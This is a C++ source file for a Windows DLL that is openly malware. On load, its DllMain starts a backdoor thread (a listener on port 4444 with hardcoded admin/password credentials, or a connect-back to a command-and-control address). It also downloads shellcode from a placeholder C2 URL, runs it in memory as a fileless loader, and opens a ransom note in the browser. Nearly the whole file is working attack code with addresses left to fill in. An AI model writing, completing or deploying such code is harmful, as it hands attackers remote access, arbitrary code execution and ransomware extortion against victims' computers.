#include <windows.h>
#include <wininet.h>
#include "backdoor.h"
#include <thread>
#include <string>
#include <shellapi.h>
#include <shlobj.h>

// Link with wininet.lib

// Download payload directly into memory
LPVOID DownloadPayload(LPCSTR url, DWORD* outSize) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) { InternetCloseHandle(hInternet); return NULL; }

    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 4096 * 1024, MEM_COMMIT, PAGE_READWRITE); // up to 4MB
    DWORD totalRead = 0, bytesRead = 0;
    while (InternetReadFile(hFile, buffer + totalRead, 4096, &bytesRead) && bytesRead)
        totalRead += bytesRead;

    InternetCloseHandle(hFile); InternetCloseHandle(hInternet);
    if (outSize) *outSize = totalRead;
    return buffer;
}

// Execute shellcode in memory
void ExecutePayload(LPVOID buffer, DWORD size) {
    DWORD oldProtect;
    VirtualProtect(buffer, size, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())buffer)();
}

// Optionally, configure these at build time or via config
#define DEFAULT_USER "admin"
#define DEFAULT_PASS "password"
#define DEFAULT_LISTEN_PORT 4444
#define DEFAULT_C2_IP "192.168.1.100"
#define DEFAULT_C2_PORT 5555

// Fileless loader: choose one mode (listen or connect-back)
void FilelessBackdoorMain() {
    // Example: start as a service (listener)
    start_service((char*)DEFAULT_USER, (char*)DEFAULT_PASS, DEFAULT_LISTEN_PORT);
    // Or, for connect-back:
    // conn_back_to_server((char*)DEFAULT_C2_IP, DEFAULT_C2_PORT);
}

// Function to display ransom note HTML in default browser
void ShowRansomNote() {
    wchar_t ransomNotePath[MAX_PATH];
    // Try to find ransom_note.html in the same directory as the DLL
    if (GetModuleFileNameW((HMODULE)&__ImageBase, ransomNotePath, MAX_PATH)) {
        wchar_t* lastSlash = wcsrchr(ransomNotePath, L'\\');
        if (lastSlash) {
            wcscpy(lastSlash + 1, L"ransom_note.html");
            // Open ransom_note.html in default browser
            ShellExecuteW(NULL, L"open", ransomNotePath, NULL, NULL, SW_SHOW);
        }
    }
}

// Automate copying ransom_note.html to the DLL directory if not present
void EnsureRansomNotePresent() {
    wchar_t dllPath[MAX_PATH];
    if (GetModuleFileNameW((HMODULE)&__ImageBase, dllPath, MAX_PATH)) {
        wchar_t* lastSlash = wcsrchr(dllPath, L'\\');
        if (lastSlash) {
            wcscpy(lastSlash + 1, L"ransom_note.html");
            // Check if ransom_note.html exists
            if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
                // Try to copy from a known location (e.g., dropper folder)
                wchar_t srcPath[MAX_PATH] = L"";
                // Example: hardcoded path, adjust as needed
                wcscpy(srcPath, L"C:\\Users\\Public\\ransom_note.html");
                CopyFileW(srcPath, dllPath, FALSE);
            }
        }
    }
}

// DllMain Entry
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
            EnsureRansomNotePresent();
            // Run backdoor in a new thread to avoid blocking loader
            std::thread(FilelessBackdoorMain).detach();
            DWORD payloadSize = 0;
            LPVOID payload = DownloadPayload("https://your-c2-server/payload.bin", &payloadSize);
            if (payload && payloadSize > 0) {
                ExecutePayload(payload, payloadSize);
                VirtualFree(payload, 0, MEM_RELEASE);
            }
            ShowRansomNote();
            break;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
